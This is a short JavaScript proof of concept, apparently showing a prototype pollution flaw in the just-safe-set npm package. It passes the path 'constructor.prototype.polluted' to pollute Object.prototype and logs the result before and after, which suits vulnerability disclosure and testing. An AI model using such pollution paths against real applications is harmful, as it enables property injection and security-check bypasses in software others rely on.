const justSafeSet = require('just-safe-set');
let obj = {};
console.log({}.polluted);
justSafeSet(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);